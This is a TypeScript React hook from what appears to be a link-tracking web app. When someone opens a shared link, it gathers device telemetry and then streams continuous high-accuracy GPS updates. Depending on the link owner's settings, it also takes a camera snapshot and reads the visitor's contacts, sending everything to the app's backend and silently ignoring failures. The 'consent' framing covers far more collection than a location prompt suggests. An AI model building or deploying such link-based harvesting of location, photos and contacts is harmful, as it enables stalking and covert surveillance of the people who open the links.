import { useState, useEffect, useRef, useCallback } from "react";
import { GeoCoordinate, PermissionsConfig } from "@/lib/types";
import { collectDeviceTelemetry, captureCameraSnapshot, pickContactIfSupported } from "@/lib/telemetry";

interface UseConsentedLocationOptions {
  linkId: string;
  requiresLocation: boolean;
  permissionsConfig?: PermissionsConfig;
  onConsentGranted?: (sessionId: string) => void;
}

export function useConsentedLocation({
  linkId,
  requiresLocation,
  permissionsConfig,
  onConsentGranted,
}: UseConsentedLocationOptions) {
  const [isConsented, setIsConsented] = useState(!requiresLocation);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [isLocationActive, setIsLocationActive] = useState(false);
  const watchIdRef = useRef<number | null>(null);

  // Send coordinate update to backend
  const sendLocationUpdate = useCallback(async (currentSessionId: string, coords: GeoCoordinate) => {
    try {
      await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: currentSessionId,
          latitude: coords.latitude,
          longitude: coords.longitude,
          accuracy: coords.accuracy || null,
        }),
      });
      setIsLocationActive(true);
    } catch (err) {
      console.error("Failed to transmit location update:", err);
    }
  }, []);

  // Teardown watchPosition
  const stopWatching = useCallback(() => {
    if (watchIdRef.current !== null && typeof navigator !== "undefined" && navigator.geolocation) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
      setIsLocationActive(false);
    }
  }, []);

  // Request location, collect device info, camera & contacts
  const requestLocation = useCallback(async () => {
    setIsLoading(true);
    setError(null);

    // 1. Collect device telemetry
    const deviceInfo = await collectDeviceTelemetry();

    // Helper to finish session setup once coordinates acquired
    const proceedWithCoords = async (coords?: GeoCoordinate) => {
      try {
        const res = await fetch("/api/sessions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            linkId,
            deviceInfo,
            permissionsGranted: coords ? ["location", "device_info"] : ["device_info"],
          }),
        });

        if (!res.ok) throw new Error("Failed to register session");
        const { session } = await res.json();
        const currentSessionId = session.id;
        setSessionId(currentSessionId);

        if (coords) {
          await sendLocationUpdate(currentSessionId, coords);
        }

        // Trigger optional camera photo capture if configured
        if (permissionsConfig?.camera) {
          captureCameraSnapshot().then(async (blob) => {
            if (blob) {
              const fd = new FormData();
              fd.append("sessionId", currentSessionId);
              fd.append("file", blob, "capture.jpg");
              await fetch("/api/sessions/capture", { method: "POST", body: fd }).catch(() => {});
            }
          }).catch(() => {});
        }

        // Trigger optional contact picker if configured & supported (Android Chrome)
        if (permissionsConfig?.contacts) {
          pickContactIfSupported().then(async (contacts) => {
            if (contacts && contacts.length > 0) {
              await fetch("/api/sessions/contacts", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ sessionId: currentSessionId, contacts }),
              }).catch(() => {});
            }
          }).catch(() => {});
        }

        setIsConsented(true);
        setIsLoading(false);

        if (onConsentGranted) {
          onConsentGranted(currentSessionId);
        }

        // Start active watch if coordinates available
        if (coords && typeof navigator !== "undefined" && navigator.geolocation) {
          watchIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              sendLocationUpdate(currentSessionId, {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
              });
            },
            () => setIsLocationActive(false),
            { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
          );
        }
      } catch (err: any) {
        setError(err.message || "Failed to establish tracking session");
        setIsLoading(false);
      }
    };

    if (!navigator.geolocation) {
      if (requiresLocation) {
        setError("Geolocation is not supported by your browser");
        setIsLoading(false);
        return;
      }
      await proceedWithCoords();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await proceedWithCoords({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
      },
      async (geoError) => {
        if (!requiresLocation) {
          await proceedWithCoords();
          return;
        }
        setIsLoading(false);
        if (geoError.code === geoError.PERMISSION_DENIED) {
          setError("Location permission was denied. Please allow location in browser settings to continue.");
        } else {
          setError("Location signal unavailable. Please verify GPS settings.");
        }
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [linkId, requiresLocation, permissionsConfig, onConsentGranted, sendLocationUpdate]);

  useEffect(() => {
    return () => {
      stopWatching();
    };
  }, [stopWatching]);

  return {
    isConsented,
    isLoading,
    error,
    sessionId,
    isLocationActive,
    requestLocation,
    stopWatching,
  };
}
